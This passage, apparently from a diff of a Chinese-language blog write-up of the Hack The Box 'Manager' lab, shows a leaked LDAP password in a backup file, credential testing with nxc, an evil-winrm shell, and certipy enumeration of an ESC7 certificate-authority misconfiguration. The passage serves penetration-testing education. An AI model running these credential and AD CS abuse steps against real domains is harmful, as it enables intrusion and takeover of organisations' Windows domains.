+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552871</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali  5.2K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> contact.html
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552875</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali  4.0K Oct <span style="color:#ae81ff">19</span> 23:01 css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552893</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali  4.0K Oct <span style="color:#ae81ff">19</span> 23:01 images
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3553052</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali   18K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> index.html
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3553053</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali  4.0K Oct <span style="color:#ae81ff">19</span> 23:01 js
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552836</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali   <span style="color:#ae81ff">698</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> .old-conf.xml
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3553056</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali  7.8K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> service.html
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552829</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 1021K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> website-backup-27-07-23-old.zip
+</span></span></code></pre></div><p>查看发现 raven 的密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager/Website<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat .old-conf.xml
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;ldap-conf xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;server&gt;
+</span></span><span style="display:flex;"><span>      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
+</span></span><span style="display:flex;"><span>      &lt;open-port enabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;389&lt;/open-port&gt;
+</span></span><span style="display:flex;"><span>      &lt;secure-port enabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span>&gt;0&lt;/secure-port&gt;
+</span></span><span style="display:flex;"><span>      &lt;search-base&gt;dc<span style="color:#f92672">=</span>manager,dc<span style="color:#f92672">=</span>htb&lt;/search-base&gt;
+</span></span><span style="display:flex;"><span>      &lt;server-type&gt;microsoft&lt;/server-type&gt;
+</span></span><span style="display:flex;"><span>      &lt;access-user&gt;
+</span></span><span style="display:flex;"><span>         &lt;user&gt;raven@manager.htb&lt;/user&gt;
+</span></span><span style="display:flex;"><span>         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
+</span></span><span style="display:flex;"><span>      &lt;/access-user&gt;
+</span></span><span style="display:flex;"><span>      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
+</span></span><span style="display:flex;"><span>   &lt;/server&gt;
+</span></span><span style="display:flex;"><span>   &lt;search type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;full&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;dir-list&gt;
+</span></span><span style="display:flex;"><span>         &lt;dir&gt;cn<span style="color:#f92672">=</span>Operator1,CN<span style="color:#f92672">=</span>users,dc<span style="color:#f92672">=</span>manager,dc<span style="color:#f92672">=</span>htb&lt;/dir&gt;
+</span></span><span style="display:flex;"><span>      &lt;/dir-list&gt;
+</span></span><span style="display:flex;"><span>   &lt;/search&gt;
+</span></span><span style="display:flex;"><span>&lt;/ldap-conf&gt;
+</span></span></code></pre></div><p>查看权限发现可以登录 WinRM。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager/Website<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.58.202 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\r</span>aven:R4v3nBe5tD3veloP3r!123
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager/Website<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm 10.129.58.202 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.58.202   <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.58.202   <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\r</span>aven:R4v3nBe5tD3veloP3r!123 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>使用 evil-winrm 登录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager/Website<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.58.202 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>              
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>aven<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>manager<span style="color:#ae81ff">\r</span>aven
+</span></span></code></pre></div><h2 id="提权至-administration">提权至 Administration</h2>
+<p>枚举权限和监听，没有有价值的发现。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>aven<span style="color:#ae81ff">\D</span>esktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>aven<span style="color:#ae81ff">\D</span>esktop&gt; netstat -ano | findstr LISTENING                                                                            
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                                            
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">888</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                                            
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">888</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3736</span>                                                                         
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                                            
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2216</span>                                                                         
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                                            
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">472</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1116</span>                                                                         
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1600</span>                                                                         
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49685          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>                                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49689          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49715          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">608</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49725          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2492</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49774          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2224</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:59496          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3736</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:59950          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4140</span>
+</span></span><span style="display:flex;"><span>  TCP    10.129.58.202:53       0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2492</span>
+</span></span><span style="display:flex;"><span>  TCP    10.129.58.202:139      0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2492</span>
+</span></span><span style="display:flex;"><span>   TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:88                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:135               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">888</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:445               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:464               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:593               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">888</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:1433              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">3736</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:5985              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:9389              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2216</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:47001             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49664             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">472</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49665             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1116</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49666             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1600</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49667             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49685             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49686             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49689             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">628</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49715             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">608</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49725             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2492</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49774             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2224</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:59496             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">3736</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:59950             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4140</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:53               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2492</span>
+</span></span></code></pre></div><h3 id="证书服务">证书服务</h3>
+<p>certutil 是系统自带的证书服务工具，getconfig 可以读取本机证书服务的配置字符串，不做任何网络请求。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>aven<span style="color:#ae81ff">\D</span>esktop&gt; certutil -getconfig
+</span></span><span style="display:flex;"><span>Config String: <span style="color:#e6db74">&#34;dc01.manager.htb\manager-DC01-CA&#34;</span>
+</span></span><span style="display:flex;"><span>CertUtil: -getconfig command completed successfully.
+</span></span></code></pre></div><p>在 Kali 中，certipy 的 find 分两步取数。先通过 LDAP 读域里的证书模版和注册服务对象，确认 CA 是否存在、发布了哪些模版；再通过 远程注册表读出 CA 自身的标志位，比如是否允许申请者自带 SAN、是否强制加密请求。最后漏洞判定会结合当前用户的嵌套组成员关系，所以同一份输出换一个帐号跑，结论可能不同。</p>
+<p><code>-valnerable</code> 只显示当前身份真正可利用的条目，<code>-stdout</code> 把结果直接打在终端而不是写成文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad find -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.129.58.202 -vulnerable -stdout
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc01.manager.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : manager-DC01-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc01.manager.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>manager-DC01-CA, DC<span style="color:#f92672">=</span>manager, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : MANAGER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        Enroll                          : MANAGER.HTB<span style="color:#ae81ff">\O</span>perator
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\R</span>aven
+</span></span><span style="display:flex;"><span>        ManageCa                        : MANAGER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\R</span>aven
+</span></span><span style="display:flex;"><span>        ManageCertificates              : MANAGER.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : MANAGER.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>                                          MANAGER.HTB<span style="color:#ae81ff">\R</span>aven
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User ACL Principals             : MANAGER.HTB<span style="color:#ae81ff">\R</span>aven
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC7                              : User has dangerous permissions.
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>ESC7 的本质是 CA 对象的权限错配。ManageCa 允许修改 CA 配置，包括发布哪些模版，分配给谁角色；ManageCertificates 是审核员权限，可以批准挂起的请求。这两个权限单独出现只是可疑，同时落在同一个低权限帐户上，就等于这个人可以自己定规则、自己审批，而 CA 又是整个域的信任根。</p>
+<p>Web Enrollment 的 HTTP 和 HTTPS 都是 False，说明 relay 到注册端点那条路不存在，只能走 RPC；User Specifield SAN 是 Disabled，意思是 CA 层面禁止申请者在请求属性里自带 SAN，所以后面不走注 SAN 的写法。</p>
+<p>通过 DCOM 直接问 CA 服务自己发布了哪些模版，拿到的是 CA 侧实际启用的清单。清单里大部分是安装时默认发布的模版，SubCA 和 Administrator 按出厂状态时不发布的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad ca -ca <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span> -list-templates -u Raven@manager.htb -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.129.58.202
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enabled certificate templates on <span style="color:#e6db74">&#39;manager-DC01-CA&#39;</span>:
+</span></span><span style="display:flex;"><span>    SubCA
